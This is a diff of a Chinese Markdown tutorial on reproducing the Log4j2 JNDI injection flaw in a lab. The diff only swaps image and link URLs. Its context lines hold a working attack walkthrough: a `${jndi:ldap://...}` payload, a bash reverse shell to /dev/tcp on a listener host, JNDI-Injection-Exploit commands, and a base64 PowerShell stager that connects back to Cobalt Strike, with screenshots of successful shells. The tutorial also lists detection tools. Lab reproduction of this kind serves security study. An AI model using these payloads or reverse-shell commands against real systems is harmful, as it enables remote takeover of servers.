@@ -41,25 +41,25 @@ nc监听或者dnslog
 
 发送payload：`${jndi:ldap://192.168.1.16:4444}`
 
-<img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-11.png" style="zoom: 67%;" />
+<img src="http://qn.laohuan.xin/Snipaste_2021-12-11_11-25-11.png" style="zoom: 67%;" />
 
 nc收到请求，证明存在漏洞
 
-![](https://cdn.laohuan.art/Snipaste_2021-12-11_11-25-22.png)
+![](http://qn.laohuan.xin/Snipaste_2021-12-11_11-25-22.png)
 
 ##### 2.漏洞利用
 
 ###### Linux反弹shell
 
-1.利用工具:[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](https://github.com/bkfish/Apache-Log4j-Learning/blob/main/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar)
+1.利用工具:[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar](http://github.com/bkfish/Apache-Log4j-Learning/blob/main/tools/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar)
 
 2.反弹shell
 
 `bash -i >& /dev/tcp/192.168.1.16/4444 0>&1`
 
-base64编码:[https://www.jackson-t.ca/runtime-exec-payloads.html/](https://www.jackson-t.ca/runtime-exec-payloads.html/)
+base64编码:[http://www.jackson-t.ca/runtime-exec-payloads.html/](http://www.jackson-t.ca/runtime-exec-payloads.html/)
 
-![](https://cdn.laohuan.art/Snipaste_2021-12-11_11-28-52.png)
+![](http://qn.laohuan.xin/Snipaste_2021-12-11_11-28-52.png)
 
 得到编码后的反弹脚本
 
@@ -79,27 +79,27 @@ base64编码:[https://www.jackson-t.ca/runtime-exec-payloads.html/](https://www.
 
 6.成功收到shell
 
-<img src="https://cdn.laohuan.art/Snipaste_2021-12-11_11-29-57.png"  />
+<img src="http://qn.laohuan.xin/Snipaste_2021-12-11_11-29-57.png"  />
 
 ###### Windows cs 上线
 
-windows使用[漏洞环境](https://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ)分享的靶场，已将漏洞环境编译为jar包。
+windows使用[漏洞环境](http://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ)分享的靶场，已将漏洞环境编译为jar包。
 
 1.首先测试是否能正常执行命令，弹出计算器作为示例
 
 `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 192.168.1.16`
 
-![](https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-19.png)
+![](http://qn.laohuan.xin/Snipaste_2021-12-11_12-21-19.png)
 
 2.使用靶场环境发送paylaod,成功弹出计算器
 
 `java -jar LogTest.jar ${jndi:ldap://192.168.1.16:1389/arvhzz}`
 
-![](https://cdn.laohuan.art/Snipaste_2021-12-11_12-21-38.png)
+![](http://qn.laohuan.xin/Snipaste_2021-12-11_12-21-38.png)
 
 3.cs生成powershell上线代码，并bash64编码
 
-![](https://cdn.laohuan.art/Snipaste_2021-12-11_14-30-05.png)
+![](http://qn.laohuan.xin/Snipaste_2021-12-11_14-30-05.png)
 
 4.使用工具开启监听
 
@@ -111,22 +111,22 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "powershell.exe -NonI -
 
 `java -jar LogTest.jar  ${jndi:ldap://192.168.1.16:1389/kmelx9}`
 
-![](https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-43.png)
+![](http://qn.laohuan.xin/Snipaste_2021-12-11_14-29-43.png)
 
 6.cs成功上线
 
-![](https://cdn.laohuan.art/Snipaste_2021-12-11_14-29-14.png)
+![](http://qn.laohuan.xin/Snipaste_2021-12-11_14-29-14.png)
 
 #### 相关漏洞检测工具
 
-* [https://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2](https://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2)
-* https://github.com/tangxiaofeng7/BurpLog4j2Scan
-* [Log4j2 Vuln Detector (chaitin.cn)](https://log4j2-detector.chaitin.cn/)
+* [http://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2](http://github.com/inbug-team/Log4j_RCE_Tool/releases/tag/Apache_Log4j_RCE0.2)
+* http://github.com/tangxiaofeng7/BurpLog4j2Scan
+* [Log4j2 Vuln Detector (chaitin.cn)](http://log4j2-detector.chaitin.cn/)
 
 #### 参考链接
 
-1. [https://github.com/fengxuangit/log4j_vuln](https://github.com/fengxuangit/log4j_vuln)
-2. [https://github.com/bkfish/Apache-Log4j-Learning](https://github.com/bkfish/Apache-Log4j-Learning)
-3. [log4j漏洞复现环境分享 (qq.com)](https://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ)
-4. [Log4J 漏洞复现+漏洞靶场 (qq.com)](https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ)
+1. [http://github.com/fengxuangit/log4j_vuln](http://github.com/fengxuangit/log4j_vuln)
+2. [http://github.com/bkfish/Apache-Log4j-Learning](http://github.com/bkfish/Apache-Log4j-Learning)
+3. [log4j漏洞复现环境分享 (qq.com)](http://mp.weixin.qq.com/s/jCHJCiZXbBnXfoMcyMDgPQ)
+4. [Log4J 漏洞复现+漏洞靶场 (qq.com)](http://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ)
 
